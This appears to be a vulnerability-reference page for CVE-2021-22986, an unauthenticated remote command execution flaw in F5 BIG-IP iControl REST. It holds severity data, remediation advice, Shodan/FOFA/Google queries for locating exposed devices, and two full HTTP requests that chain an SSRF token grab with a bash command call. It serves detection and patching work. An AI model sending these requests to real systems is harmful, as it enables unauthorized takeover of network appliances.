---
layout: post
cve_id: CVE-2021-22986
title: F5 iControl REST - Remote Command Execution
pcap: true
pcap_path: /pcaps/2021/CVE-2021-22986.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2021/CVE-2021-22986.yaml
snort2_rule: N/A
snort3_rule: N/A
author: rootxharsh,iamnoooob
severity: critical
impact: 'Successful exploitation of this vulnerability can lead to unauthorized access,
  data leakage, and potential compromise of the target system.

  '
remediation: 'Apply the necessary security patches or updates provided by F5 Networks
  to mitigate the vulnerability.

  '
reference:
- https://attackerkb.com/topics/J6pWeg5saG/k03009991-icontrol-rest-unauthenticated-remote-command-execution-vulnerability-cve-2021-22986
- https://support.f5.com/csp/article/K03009991
- http://packetstormsecurity.com/files/162059/F5-iControl-Server-Side-Request-Forgery-Remote-Command-Execution.html
- https://nvd.nist.gov/vuln/detail/CVE-2021-22986
- https://github.com/Miraitowa70/POC-Notes
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 9.8
  cve-id: CVE-2021-22986
  cwe-id: CWE-918
  epss-score: 0.94485
  epss-percentile: 0.99998
  cpe: cpe:2.3:a:f5:big-ip_access_policy_manager:*:*:*:*:*:*:*:*
metadata:
  max-request: 2
  vendor: f5
  product: big-ip_access_policy_manager
  shodan-query: http.title:"big-ip&reg;-+redirect" +"server"
  fofa-query: title="big-ip&reg;-+redirect" +"server"
  google-query: intitle:"big-ip&reg;-+redirect" +"server"
tags:
- cve
- cve2021
- bigip
- rce
- kev
- packetstorm
- f5
- vkev
- vuln
---

## üîç Vulnerability Description
F5 iControl REST interface is susceptible to remote command execution. An attacker can execute malware, obtain sensitive information, modify data, and/or gain full control over a compromised system without entering necessary credentials. This affects BIG-IP 16.0.x before 16.0.1.1, 15.1.x before 15.1.2.1, 14.1.x before 14.1.4, 13.1.x before 13.1.3.6, and 12.1.x before 12.1.5.3; and BIG-IQ 7.1.0.x before 7.1.0.3 and 7.0.0.x before 7.0.0.2.

## üåê HTTP Request
```nohighlight
POST /mgmt/shared/authn/login HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Content-Length: 103
Accept-Language: en
Authorization: Basic YWRtaW46
Connection: close
Content-Type: application/json
Cookie: BIGIPAuthCookie=1234
Accept-Encoding: gzip
{"username":"admin","userReference":{},"loginReference":{"link":"http://localhost/mgmt/shared/gossip"}}
```

```nohighlight
POST /mgmt/tm/util/bash HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Debian; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Content-Length: 39
Accept-Language: en
Connection: close
Content-Type: application/json
X-F5-Auth-Token: gPz8dD
Accept-Encoding: gzip
{"command":"run","utilCmdArgs":"-c id"}
```

